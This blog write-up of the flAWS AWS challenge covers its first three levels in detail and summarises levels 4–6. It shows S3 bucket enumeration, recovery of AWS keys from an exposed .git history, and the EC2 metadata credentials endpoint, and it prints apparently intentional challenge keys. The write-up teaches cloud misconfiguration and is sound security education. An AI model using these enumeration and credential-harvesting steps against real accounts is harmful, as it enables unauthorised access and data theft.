---
title: "AWS Security: flAWS Challenge Writeup"
summary: "On this blog post, I'll take you with me on the flaws challenge which is about solving and learning about the most common mistakes and misconfigurations of AWS services that can allow attackers to ruin your day."
date: "Nov 26 2024"
draft: false
tags:
- Cloud Security
- AWS
- AWS Security
- flAWS
- Writeup
---

# The flAWS Challenge
You can think of the [flaws.cloud](http://flaws.cloud) challenge as like a CTF. Through a series of levels/challenges we gonna learn the most common mistakes people make when deploying resources on AWS. Mistakes that can go from annoying to straight up get you fired from your job.

All challenges are run out of a single AWS account, and they are all sub-domains of [flaws.cloud](http://flaws.cloud). 

Before we begin, here is an executive summary for future me or anyone who needs a refresher on what was covered in this series of challenges.

## Summary

```bash
### Level 1

# check if site is hosted on S3
dig flaws.cloud
# find out which region the hosting S3 bucket is in
dig -x 52.218.154.10
# use the domain name and region to figure out the S3 endpoint hosting the website
# http://flaws.cloud.s3-website-us-west-2.amazonaws.com/
# use AWS CLI to list a publically accessible S3 bucket contents
# --no-sign-request tells AWS CLI to not include authentication headers with the request
aws s3 ls s3://flaws.cloud/ --region us-west-2 --no-sign-request
# use this legacy S3 endpoint to list buckets in regions launched before 2019
## bucket-name.s3.amazonaws.com
# https://flaws.cloud.s3.amazonaws.com/

### Level 2
# Bucket policy doesn't allows un-authenticated users to access it, but it allows
# any authenticated user to
# Bucket policy needs to block access to everyone except accounts who belong to the company's organization  
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud


### Level 3
# List the .git directory inside an S3 bucket
# --recursive tells the CLI to list nested directories
aws s3 ls level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/ --recursive --no-sign-request
# Download directory to host from S3 bucket
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ ./level_3 --no-sign-request
# show the changes a commit has
git show f52ec
# rollback to a certain commit
git checkout f52ec
# configure AWS CLI to use credentials
aws configure
# we can use profiles to switch between different account in AWS CLI
aws --profile <profile-name> configure


### Level 4
# "whoami" of AWS CLI. We can get the IAM user id from here
aws --profile flaws sts get-caller-identity
# List EC2 snapshots that we are the owner of and located in a specific region
aws ec2 describe-snapshots --owner-id 975426262029 --region us-west-2
# create a volume from a snapshot to be able to access its contents
aws --profile ahmouden ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id snap-0b49342abd1bdcb89
# after attaching the volume to an EC2 instance
# list available block devices
lsblk
# mount volume to a directory
sudo mount /dev/xvdb1 /mnt

### Level 5
# Instance MetaData Service (IMDS) IP
## 169.254.169.254
# EC2 role credentials can be found in this endpoint
## 169.254.169.254/latest/meta-data/iam/security-credentials/flaws
# add role credentials to AWS CLI as a profile
# edit this file ~/.aws/credentials
cat .\credentials
[level5]
aws_access_key_id = ASIA6GG7PSQGQHCYCHSK
aws_secret_access_key = szcb/pp0Ux1zksAQGGrghhj6XvcpBThZo58fXxMS
aws_session_token = IQ --SNIP-- 9EYx8EwGm6HpxxHQfb4=

### Level 6
# list all s3 buckets owned by a user
aws --profile level6 s3 ls
# list users in an account
aws --profile level6 --region us-west-2 iam list-users

# list policies that are attached to an IAM user
aws --profile level6 --region us-west-2 iam list-attached-user-policies --user-name level6

# get more information about a policy
aws --profile level6 --region us-west-2 iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways

# retrieve the contents of a policy
aws --profile level6 --region us-west-2 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4


# list all lambda functions
aws --profile level6 --region us-west-2 lambda list-functions
# list who has permissions to invoke the lambda function or any other permissions
aws --profile level6 --region us-west-2 lambda get-policy --function-name Level6 | jq '. | .Policy |= fromjson | .'
# list available stages of an API
aws --profile level6 --region us-west-2 apigateway get-stages --rest-api-id s33ppypa75
# List all API Endpoints of an API
aws --profile level6 --region us-west-2 apigateway get-resources --rest-api-id s33ppypa75
# Invoke a lambda function through this url format
# https://<api-id>.execute-api.<region>.amazonaws.com/<stage>/<api-endpoint>
# https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6


```


## Level 1: Bucket policy open for everyone

Level 1 link:

```
http://flaws.cloud/
```

The goal of this level is to find a secret page that contains the link to the second level.

Since this site is about AWS challenges then AWS is probably involved in some way.

Let's find out where this site is hosted at. `dig` is a command used to query DNS servers. By default `dig` looks up the **A records** of the domain. 

The **A** in **A record** stands for **Address**. Normal sites have one A record, and high-profile websites have several different A records for the purpose of load balancing.

The main purpose of A records is to translate a domain name into an IP address. And that is exactly what we are going to use here to find out the server hosting the [flaws.cloud](http://flaws.cloud) website.

```console
~ ❯ dig flaws.cloud

; <<>> DiG 9.18.28-0ubuntu0.24.04.1-Ubuntu <<>> flaws.cloud
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 10218
;; flags: qr rd ad; QUERY: 1, ANSWER: 8, AUTHORITY: 0, ADDITIONAL: 0
;; WARNING: recursion requested but not available

;; QUESTION SECTION:
;flaws.cloud.                   IN      A

;; ANSWER SECTION:
flaws.cloud.            0       IN      A       52.218.154.10
flaws.cloud.            0       IN      A       52.92.234.243
flaws.cloud.            0       IN      A       52.92.128.139
flaws.cloud.            0       IN      A       52.218.133.91
flaws.cloud.            0       IN      A       52.92.160.67
flaws.cloud.            0       IN      A       52.92.211.163
flaws.cloud.            0       IN      A       52.92.149.155
flaws.cloud.            0       IN      A       52.92.195.19

;; Query time: 58 msec
;; SERVER: 172.18.48.1#53(172.18.48.1) (UDP)
;; WHEN: Tue Nov 26 23:22:33 +01 2024
;; MSG SIZE  rcvd: 168
```

[flaws.cloud](http://flaws.cloud) has 8 A records, and all of these A records belong to **Amazon S3**, which means it is hosted there, in an S3 bucket. S3 buckets are a common hosting solution people use to host static sites.

You can see in the screenshot below that two of the A records redirect to Amazon S3.

![A records belong to Amazon S3](assets/a_records_belong_to_s3.png)

In the first command we performed a **Forward DNS Lookup** where we queried the **IP address** associated with a domain name. Next we gonna perform a **Reverse DNS Lookup** to query the **domain name** associated with an IP address.

We can do this using one of these two commands:
```console
dig -x 52.218.154.10
host 52.218.154.10
```

![Reverse DNS lookup of the S3 IPs](assets/reverse_dns_lookup_s3_ip.png)

Reverse DNS Lookup returns a pointer to one of Amazon S3 website endpoints (you can find the full list [here](https://docs.aws.amazon.com/general/latest/gr/s3.html), and here is the docs about the website endpoints [here](https://docs.aws.amazon.com/AmazonS3/latest/userguide/WebsiteEndpoints.html)).

Based on the documentation, Amazon S3 website endpoint follows one of these two formats depending on the region of the S3 bucket:

![S3 website endpoint formats](assets/amazon_s3_bucket_website_endpoint_formats.png)

Great! now we know the bucket is hosted in the **US-WEST-2** region.

Here are more interesting facts:
- When an S3 bucket is configured to host a static website, the bucket name must match the domain name
- S3 buckets are a global name space, which means all names must be unique

Since we know the domain name is `flaws.cloud`, and the region, then we can build the S3 website endpoint to [http://flaws.cloud.s3-website-us-west-2.amazonaws.com](http://flaws.cloud.s3-website-us-west-2.amazonaws.com).

And by visiting it we'll get the same website as visitng [http://flaws.cloud](http://flaws.cloud) :

![Visiting S3 Website Endpoint](assets/s3_website_endpoint_visit.png)

The bucket is a publically accessible which means we can list all the files inside it.

```console
aws s3 ls s3://flaws.cloud/ --region us-west-2 --no-sign-request
```

`--no-sign-request` is used to skip loading credentials for this command.

```console
awscli ❯ aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
2017-03-14 04:00:38       2575 hint1.html
2017-03-03 05:05:17       1707 hint2.html
2017-03-03 05:05:11       1101 hint3.html
2024-02-22 03:32:41       2861 index.html
2018-07-10 17:47:16      15979 logo.png
2017-02-27 02:59:28         46 robots.txt
2017-02-27 02:59:30       1051 secret-dd02c7c.html
awscli ❯
```
Let's browse the secret page

[http://flaws.cloud/secret-dd02c7c.html](http://flaws.cloud/secret-dd02c7c.html)

![Level 1 Secret Page](assets/flaws_cloud_lvl1_secret_page.png)

Next level page
[http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/](http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/)

What we did there is a basic test for misconfigured **list permissions** in S3 buckets. List permissions used to be enabled **by default**. Now it's disabled by default, and you need to explicitly declare that you want them enabled.

But not all **public** S3 buckets are a bad thing. Some buckets are **meant to be public**.


Here are some more interesting facts and notes:
- S3 buckets don't use HTTPS only HTTP
- To find out if a website is using S3 buckets, check the HTTP requests in your proxy intercepting tool looking for this regex: 
    ```
    \.s3\.amazonaws\.com\/?
    ```

- or for these headers:
    ```console
    x-amz-bucket-region
    x-amz-request-id
    x-amz-id-2
    ```

According to this documentation about [**Virtual hosting of buckets**](https://docs.aws.amazon.com/AmazonS3/latest/userguide/VirtualHosting.html), section **Legacy global endpoint**, we can access the bucket using the legacy global endpoint. Buckets in regions launched before 2019 can be accesed using the legacy global endpoint. In the legacy global endpoint, requests we don't need to specify the region.

The syntax of a legacy global endpoint request looks like this
```console
bucket-name.s3.amazonaws.com
```

[flaws.cloud](http://flaws.cloud) is located in the **US-WEST-2** region which was launched in 2011. We can access the bucket using the this endpoint:

[https://flaws.cloud.s3.amazonaws.com/](https://flaws.cloud.s3.amazonaws.com/)

And it will list the contents of the bucket for us:
![](assets/flaws_cloud_lvl1_legacy_global_endpoint_screenshot.png)

That is another way to quickly test for list permissions misconfigurations.


## Level 2: Bucket policy open for everyone who is authenticated

What we learned is the following:
- S3 can be configured with all sorts of permissions and functionality (eg. read/write permissions, functionality like being used a static site)
- Don't enable **Directory Listing** of the S3 bucket
- Don't give out more R/W permissions **that what is needed**.

[Legal Robot](https://hackerone.com/reports/163476), 2016, directory listing was enabled on a public S3 bucket ( `legalrobot.s3.amazonaws.com` ) they were using for their landing page.

[Shopify](https://hackerone.com/reports/57505), 2015, again directory listing was enabled on an S3 bucket ( `http://shopify.com.s3.amazonaws.com/` ) that was intended to be public.

[Shopify again](https://hackerone.com/reports/111643), 2016, this time with an S3 bucket with too much permissions that allowed anyone to read, write, and list objects. The bucket was used internally to store AWS CloudTrail Logs, so some serious and sensitive stuff. 

[Udemy](https://hackerone.com/reports/131468), 2016, some Udemy team created an S3 bucket for maven stuff but allowed any authenticated user to have write permissions on the bucket.

Let us create an S3 bucket right now with default options and see how the default security configuration is:

So by default all public access is blocked:
![](assets/s3_bucket_creation_all_public_access_blocked.png)

And the S3 bucket name global namespace is at play here since I want to create a bucket with the name of `flaws.cloud`:
![](assets/s3_bucket_name_duplicate_error.png)

I want to create a bucket and allow public access, let's name the bucket `free4all.fun` in the `eu-west-3` region. Based on that the bucket should be accessible through this url

```
http://free4all.fun.s3.eu-west-3.amazonaws.com
```

I disabled the **Block all public access** in the bucket settings:
![](assets/s3_block_public_access_setting_disabled.png)

I modified the bucket policy to allow `ListBucket` 

![](assets/s3_bucket_policy_ListBucket_allowed.png)

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::xxxxxxxxxxxx:user/YYYYYY"
            },
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::free4all.fun"
        }
    ]
}
```

Next i uploaded a file to the bucket, configured `awscli` with the credentials of the account who owns the bucket, and listed the objects in the bucket, and it works for the owner:

```console
d ❯ aws s3 ls s3://free4all.fun/ --region eu-west-3
2024-12-03 00:01:07      14216 cute_cat.png
d ❯
```

But it doesn't list the bucket of an unauthenticated user
```console
d ❯ aws s3 ls s3://free4all.fun/ --region eu-west-3 --no-sign-request

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
d ❯ 
```

All we have to do is to edit the bucket policy, specifically the `Principal` key, and use the **All Wildcard** operator `*` which tells AWS to allow everyone to perform the `ListBucket` action on the our bucker resource.

(I edited the Principal if you didn't notice)

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": [
                    "arn:aws:iam::XXXXXXXXXX:user/YYYYYYYY",
                    "*"
                ]
            },
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::free4all.fun"
        }
    ]
}
```

And now everyone can list the objects and download an image of a cute cat

```console
d ❯ aws s3 ls s3://free4all.fun/ --region eu-west-3 --no-sign-request
2024-12-03 00:01:07      14216 cute_cat.png
d ❯
```

We can see the objects from this link also
```
http://free4all.fun.s3.eu-west-3.amazonaws.com
```

![](assets/s3_bucket_public_access.png)

Okay! back to Level 2.

We have a URL in our hands, probably an S3 bucket again

```
http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/
```

Let's try to list the bucket without signing the request
```
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --no-sign-request
```

```console
~ ❯ aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --no-sign-request

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
~ ❯  
```

Alright the bucket policy doesn't allow un-authenticated accounts to list the contents of the bucket.

Let's try it with an account this time (just ommit the `--no-sign-request` switch)
```
~ ❯ aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-27 03:02:15      80751 everyone.png
2017-03-03 04:47:17       1433 hint1.html
2017-02-27 03:04:39       1035 hint2.html
2017-02-27 03:02:14       2786 index.html
2017-02-27 03:02:14         26 robots.txt
2017-02-27 03:02:15       1051 secret-e4443fc.html
```

What is in the secret page?

![](assets/flaws_level_2_secret_page.png)

People configuring the bucket access policy can make the mistake of thinking if the bucket isn't accessible by the public then it must be safe. This is a mistake since we can configure a bucket to be non-accessible to the public but still anyone authenticated can access it. 

To the next level..

## Level 3: .git and the forgotten secrets

[Shopify](https://hackerone.com/reports/98819) back in 2015 had buckets that allowed **authenticated users** read/write permissions. They throught authenticated users meant users that were part of Shopify, but that was a wrong assumption.

We working on this bucket right now

```
http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/
```

Let's try and list the objects
```console
~ ❯ aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --no-sign-request                                                                                    ⏎
                           PRE .git/
2017-02-27 01:14:33     123637 authenticated_users.png
2017-02-27 01:14:34       1552 hint1.html
2017-02-27 01:14:34       1426 hint2.html
2017-02-27 01:14:35       1247 hint3.html
2017-02-27 01:14:33       1035 hint4.html
2020-05-22 19:21:10       1861 index.html
2017-02-27 01:14:33         26 robots.txt
~ ❯
```

Let's download that image first

```console
~ ❯ aws s3api get-object --bucket level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --key authenticated_users.png authenticated_users.png --no-sign-request
~ ❯ ls
authenticated_users.png  awscli  base64  github  go  test
~ ❯      
```

And long and behold the picture

![](assets/flaws_level_3_the_picture.png)

I guess that's not very useful since it was used to demonstrate the misconfiguration that allowed us to access the level 2 bucket.

Anyway, let's continue. We are searching for an AWS access key, and that `.git/` in the bucket looks very interesting.

Trying to list the contents of the `.git/` directory as we do with the previous buckets won't work because the default behavior for `ls` is to interact with the current directory and not go deeper into any nested subdirectories

To list subdirectories and nested files we must use the `--recursive` switch with the command.

```console
~ ❯ aws s3 ls level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/ --recursive --no-sign-request                                            ⏎
2017-09-17 16:12:24         52 .git/COMMIT_EDITMSG
2017-09-17 16:12:24         23 .git/HEAD
2017-09-17 16:12:24        130 .git/config
2017-09-17 16:12:24         73 .git/description
2017-09-17 16:12:24        452 .git/hooks/applypatch-msg.sample
2017-09-17 16:12:24        896 .git/hooks/commit-msg.sample
2017-09-17 16:12:24        189 .git/hooks/post-update.sample
2017-09-17 16:12:24        398 .git/hooks/pre-applypatch.sample
2017-09-17 16:12:24       1704 .git/hooks/pre-commit.sample
2017-09-17 16:12:24       4898 .git/hooks/pre-rebase.sample
2017-09-17 16:12:24       1239 .git/hooks/prepare-commit-msg.sample
2017-09-17 16:12:24       3611 .git/hooks/update.sample
2017-09-17 16:12:24        600 .git/index
2017-09-17 16:12:24        240 .git/info/exclude
2017-09-17 16:12:24        359 .git/logs/HEAD
2017-09-17 16:12:24        359 .git/logs/refs/heads/master
2017-09-17 16:12:24        679 .git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25
2017-09-17 16:12:24        770 .git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df
2017-09-17 16:12:25        820 .git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c
2017-09-17 16:12:25        245 .git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b
2017-09-17 16:12:25     112013 .git/objects/76/e4934c9de40e36f09b4e5538236551529f723c
2017-09-17 16:12:25        560 .git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c
2017-09-17 16:12:25        191 .git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
2017-09-17 16:12:25         42 .git/objects/c2/aab7e03933a858d1765090928dca4013fe2526
2017-09-17 16:12:25        904 .git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2
2017-09-17 16:12:25         98 .git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2
2017-09-17 16:12:25        279 .git/objects/f2/a144957997f15729d4491f251c3615d508b16a
2017-09-17 16:12:25        125 .git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61
2017-09-17 16:12:25         41 .git/refs/heads/master
~ ❯
```

This is big, because if any credentials exist in the configuration files in any of the commits (intentionally or by mistake) we can access them.

Since this is a `.git` directory, let's copy the whole bucket to our local host using the `sync` command.

```
~ ❯ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ ./level_3 --no-sign-request
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/COMMIT_EDITMSG to level_3/.git/COMMIT_EDITMSG
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/commit-msg.sample to level_3/.git/hooks/commit-msg.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/HEAD to level_3/.git/HEAD
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/config to level_3/.git/config
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/description to level_3/.git/description
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/applypatch-msg.sample to level_3/.git/hooks/applypatch-msg.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-commit.sample to level_3/.git/hooks/pre-commit.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-applypatch.sample to level_3/.git/hooks/pre-applypatch.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/post-update.sample to level_3/.git/hooks/post-update.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-rebase.sample to level_3/.git/hooks/pre-rebase.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/prepare-commit-msg.sample to level_3/.git/hooks/prepare-commit-msg.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/update.sample to level_3/.git/hooks/update.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c to level_3/.git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/index to level_3/.git/index
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df to level_3/.git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/info/exclude to level_3/.git/info/exclude
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25 to level_3/.git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c to level_3/.git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/logs/refs/heads/master to level_3/.git/logs/refs/heads/master
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/logs/HEAD to level_3/.git/logs/HEAD
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 to level_3/.git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2 to level_3/.git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b to level_3/.git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/c2/aab7e03933a858d1765090928dca4013fe2526 to level_3/.git/objects/c2/aab7e03933a858d1765090928dca4013fe2526
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2 to level_3/.git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint3.html to level_3/hint3.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint1.html to level_3/hint1.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint4.html to level_3/hint4.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/index.html to level_3/index.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint2.html to level_3/hint2.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/robots.txt to level_3/robots.txt
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/f2/a144957997f15729d4491f251c3615d508b16a to level_3/.git/objects/f2/a144957997f15729d4491f251c3615d508b16a
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/refs/heads/master to level_3/.git/refs/heads/master
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61 to level_3/.git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/76/e4934c9de40e36f09b4e5538236551529f723c to level_3/.git/objects/76/e4934c9de40e36f09b4e5538236551529f723c
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png to level_3/authenticated_users.png
~ ❯
```

```
level_3 git:master ❯ ls -al                                                                                                                      ✹
total 160
drwxr-xr-x  3 hmaz hmaz   4096 Dec  5 07:07 .
drwxr-x--- 17 hmaz hmaz   4096 Dec  5 07:08 ..
drwxr-xr-x  7 hmaz hmaz   4096 Dec  5 07:07 .git
-rw-r--r--  1 hmaz hmaz 123637 Feb 27  2017 authenticated_users.png
-rw-r--r--  1 hmaz hmaz   1552 Feb 27  2017 hint1.html
-rw-r--r--  1 hmaz hmaz   1426 Feb 27  2017 hint2.html
-rw-r--r--  1 hmaz hmaz   1247 Feb 27  2017 hint3.html
-rw-r--r--  1 hmaz hmaz   1035 Feb 27  2017 hint4.html
-rw-r--r--  1 hmaz hmaz   1861 May 22  2020 index.html
-rw-r--r--  1 hmaz hmaz     26 Feb 27  2017 robots.txt
level_3 git:master ❯
```

Let's check git status

```
level_3 git:master ❯ git status                                                                                                                  ✹
On branch master
Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        modified:   index.html

no changes added to commit (use "git add" and/or "git commit -a")
level_3 git:master ❯
```

So `index.html` was changed from the latest commit.

Let's check the commits history using the `git log` command:

```
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
(END)
```

There are 2 commits, and the first one has some kind of credential. Let's read what was done on that commit using the 
```console
git show <commit-id>
```

```sh
git show f52ec
commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit

diff --git a/access_keys.txt b/access_keys.txt
new file mode 100644
index 0000000..e3ae6dd
--- /dev/null
+++ b/access_keys.txt
@@ -0,0 +1,2 @@
+access_key AKIAJ366LIPB4IJKT7SA
+secret_access_key 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
diff --git a/authenticated_users.png b/authenticated_users.png
new file mode 100644
index 0000000..76e4934
Binary files /dev/null and b/authenticated_users.png differ
diff --git a/hint1.html b/hint1.html
new file mode 100644
index 0000000..5323d77
--- /dev/null
+++ b/hint1.html
@@ -0,0 +1,38 @@

-- Snipped --
```

Look! AWS credentials in the `access_keys.txt` file.

We can go back to the last commit to actually see the deleted file

```
level_3 git:master ❯ git checkout f52ec                                                                                                                                     
M       index.html
Note: switching to 'f52ec'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at f52ec03 first commit
level_3 git:f52ec03 ❯ ll                                                                                                                                                    
total 152K
-rw-r--r-- 1 hmaz hmaz   91 Dec  5 07:17 access_keys.txt
-rw-r--r-- 1 hmaz hmaz 121K Feb 27  2017 authenticated_users.png
-rw-r--r-- 1 hmaz hmaz 1.6K Feb 27  2017 hint1.html
-rw-r--r-- 1 hmaz hmaz 1.4K Feb 27  2017 hint2.html
-rw-r--r-- 1 hmaz hmaz 1.3K Feb 27  2017 hint3.html
-rw-r--r-- 1 hmaz hmaz 1.1K Feb 27  2017 hint4.html
-rw-r--r-- 1 hmaz hmaz 1.9K May 22  2020 index.html
-rw-r--r-- 1 hmaz hmaz   26 Feb 27  2017 robots.txt

level_3 git:f52ec03 ❯ cat access_keys.txt                                                                                                                                   
access_key AKIAJ366LIPB4IJKT7SA
secret_access_key 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
```

We can use the credentials in AWS CLI this way

```
~ ❯ aws configure
AWS Access Key ID [****************JD6U]: AKIAJ366LIPB4IJKT7SA
AWS Secret Access Key [****************GJ/b]: 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
Default region name [None]:
Default output format [None]:
```

And now let's list all S3 buckets in this account

```
~ ❯ aws s3 ls
2017-02-12 22:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 17:34:53 config-bucket-975426262029
2017-02-12 21:03:24 flaws-logs
2017-02-05 04:40:07 flaws.cloud
2017-02-24 02:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 19:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 19:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-26 20:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-26 20:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-26 21:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
~ ❯
```

Well that looks like all the buckets.

I guess we could've used **Profiles** in **AWS CLI** so we can swiftly switch between accounts.

Here are the commands again but using a profile for `flaws`

```
~ ❯ aws configure --profile flaws
AWS Access Key ID [None]: AKIAJ366LIPB4IJKT7SA
AWS Secret Access Key [None]: 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
Default region name [None]:
Default output format [None]:

~ ❯ aws --profile flaws s3 ls
2017-02-12 22:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 17:34:53 config-bucket-975426262029
2017-02-12 21:03:24 flaws-logs
2017-02-05 04:40:07 flaws.cloud
2017-02-24 02:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 19:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 19:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-26 20:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-26 20:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-26 21:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
~ ❯
```

Let's go to the next level, level 4.

## Level 4: The snapshot is the answer

Level URL

```
http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/
```

I personally saw this (and may or may not have done it myself) where someone would push some API key or some credentials to the code repository, realize their mistake, push a new commit that deletes or replaces the credentials with environment variables.

The problem is the credentials are still visible in the commits history, and if they didn't get revoked and rotated, we still got a problem.

